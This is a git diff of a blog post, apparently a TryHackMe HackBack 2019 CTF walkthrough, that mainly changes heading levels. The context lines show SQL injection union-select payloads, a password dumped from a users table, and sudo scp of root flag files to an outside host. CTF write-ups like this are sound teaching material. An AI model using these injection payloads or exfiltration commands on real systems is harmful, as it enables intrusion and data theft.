@@ -6,9 +6,7 @@ tags: ctf tryhackme
 toc: true
 ---
 
-# TryHackMe - HackBack 2019
-
-## Task 1: Connect to our network 
+# Task 1: Connect to our network 
 Free points for connecting to the challenge network? Sweet. However, our University address space conflicted with the CTF address space, making things a little harder. To get around this, I used a NAT adapter on my Kali VM to put it in a 192.0.0.0/8 address range, which solved the issue.
 >
 {% highlight bash %}
@@ -17,9 +15,9 @@ openvpn --config ./username.ovpn --daemon
 
 Once connected simply submit empty answers to get the points.
 
-## Task 2: Pickle Rick [Web Exploitation] [Easy]
+# Task 2: Pickle Rick [Web Exploitation] [Easy]
 
-### Question 1: What is the first ingredient Rick needs?
+## Question 1: What is the first ingredient Rick needs?
 
 As this is as an easy task I expected that either credentials or flags would be leaked somewhere on the page, opposed to through any fancy exploitation. If we look at the source code of the homepage we can see a username "hidden" as a comment.
 
@@ -55,7 +53,7 @@ After login, we are given a primitive web shell with limited command access. An 
 mr. meeseek hair
 {% endhighlight  %}
 
-### Question 2: Whats the second ingredient Rick needs?
+## Question 2: Whats the second ingredient Rick needs?
 
 We got a clue from the web directory about the location of the second ingrediant.
 
@@ -78,7 +76,7 @@ grep .* /home/rick/second\ ingredients
 1 jerry tear
 {% endhighlight  %}
 
-### Question 3: Whats the final ingredient Rick needs?
+## Question 3: Whats the final ingredient Rick needs?
 
 As this is the last flag, I assumed it would likely be in root. However, we don't have permissions to browse that directory yet. Originally I used Perl to create a reverse shell to use sudo as I thought a TTY would be required, however, it turns out we can just use sudo from this web terminal. A "sudo ls" of "/root" shows us a "3rd.txt" which looks like what we are looking for.
 >{% highlight bash %}
@@ -91,7 +89,7 @@ sudo grep .* /root/3rd.txt
 fleeb juice
 {% endhighlight  %}
 
-## Task 3: Gotta Catch em All [Scripting] [Medium]
+# Task 3: Gotta Catch em All [Scripting] [Medium]
 
 To complete this challenge we need to understand what it wants us to create. It tells us that we need to connect to a specified port, do an operation on a number, and move on to the next port.
 
@@ -187,7 +185,7 @@ print(round(total,2))
 {% endhighlight  %}
 
 
-## Task 4: Jursassic Park [Web Exploitation] [Medium]
+# Task 4: Jursassic Park [Web Exploitation] [Medium]
 
 Straight from the questions, we can tell that this probably going to involve SQL injection. It references database information in the first flags then seems to move on to compromising the server as a whole.
 
@@ -205,7 +203,7 @@ However, we can confirm SQL Injection is possible as if we enter strings like "3
 
 Testing of these characters shows that # isn't correctly filtered and can be used to comment out the rest of the code.
 
-### Question 1: What is the SQL database called which is serving the shop information?
+## Question 1: What is the SQL database called which is serving the shop information?
 
 Using "union select" we can add extra data onto the data returned by the query. Any columns we don't need can simply be filled with null to match the number of columns in the other search. The "DATABASE()" function should give us the answer to this question if the backend is using MySQL, and indeed it does, the following id parameter will tell us that the database name is "park".
 
@@ -213,11 +211,11 @@ Using "union select" we can add extra data onto the data returned by the query. 
 id=1 union select null, null, null, DATABASE(), null#
 {% endhighlight  %}
 
-### Question 2: How many columns does the table have?
+## Question 2: How many columns does the table have?
 
 Given that 5 fields were required for the union select, that is a solid guess for this question and indeed it is correct.
 
-### Question 3: Whats the system version?
+## Question 3: Whats the system version?
 
 Similar to the first question, we can use the "version()" function to get the version of both the database server and the server it is running on.
 
@@ -228,7 +226,7 @@ id=1 union select null, null,null , version(), null#
 This returns "5.7.25-0ubuntu0.16.04.2" - telling us that the operating system is Ubuntu 16.04.2, and the database version being MySQL 5.7.25-0.
 
 
-### Question 4: What is dennis' password?
+## Question 4: What is dennis' password?
 
 For this question, I tried a bunch of things. Getting the MySQL authentication strings and attempting to crack them with John the Ripper. I tried again to get SQLMap to pop a shell to get access to the file system, but once again I failed. I also tried to read "/etc/passwd" through SQL, but that didn't work suggesting "secure file priv" was enabled.
 
@@ -253,7 +251,7 @@ id=0 union select *, null, null FROM users  LIMIT 1 OFFSET 1#
 
 This gives us dennis' password - "ih8dinos"
 
-### Question 5: Locate and get the first flag contents.
+## Question 5: Locate and get the first flag contents.
 
 Helpfully the credentials of "dennis:ih8dinos" are also valid for SSH access. The first flag can be found in the home directory of dennis.
 
@@ -265,7 +263,7 @@ Congrats on finding the first flag.. But what about the rest? :O
 b89f2d69c56b9981ac92dd267f
 {% endhighlight  %}
 
-### Question 7: Whats the contents of the third flag?
+## Question 7: Whats the contents of the third flag?
 
 I guessed that the second flag might be somewhere in the web site's files somewhere, so I decided to have a quick look before examining the file system further. I didn't find a flag, but I did figure out why SQLMap was choking so hard.
 
@@ -317,7 +315,7 @@ sudo scp /root/flag5.txt ben@10.8.0.6:~/
 
 I wasn't looking for the third flag but I'll take it.
 
-### Question 9: Whats the contents of the fifth flag?
+## Question 9: Whats the contents of the fifth flag?
 
 Since I had a lead on the fifth flag, I decided to go for that one next. Since the next flag is in root and the bash history shows the use of sudo, I used "sudo -l" to see what command we were allowed to use as root. Helpfully, like in the user's history, we can use scp as root. 
 
@@ -334,7 +332,7 @@ sudo scp /root/flag5.txt dennis@10.0.0.222:~/
 2a7074e491fcacc7eeba97808dc5e2ec
 {% endhighlight  %}
 
-### Question 6: Whats the contents of the second flag?
+## Question 6: Whats the contents of the second flag?
 
 At this point, I decided that needed root to continue, so I decided to look into privledge escalation exploits for this system. Given that the "delete" file in the web directory hints at a MySQL privilege escalation vulnerability. I tried using both search sploit for the kernel and MySQL versions, as well as creating a reverse shell for Metasploit and using their local exploit suggester.
 
@@ -365,7 +363,7 @@ Looks promising.
 
 Bingo.
 
-### Question 8: Whats the contents of the fourth flag?
+## Question 8: Whats the contents of the fourth flag?
 
 Going around this in a weird order, but the last flag I needed to find was Flag 4. Unfortunately I couldn't find it anywhere!
 
@@ -375,7 +373,7 @@ I also tried a whole bunch of common other locations such as crontab, important 
 
 I even tried using dd and ssh to copy an image of the hard drive over the network to my computer. I did find some evidence of the flag file but I don't have enough experiance with hard drive foresrensics to locate it within the image.
 
-##Task 5: Base64 [Scripting] [Easy]
+#Task 5: Base64 [Scripting] [Easy]
 
 While my initial gut reaction was to use bash for this, I decided to use Python as I'm more capable with it and debugging would be quicker for me personally. The instructions for this are quite clear, you needed to base64 decode the string 50 times, so here is my python script.
 
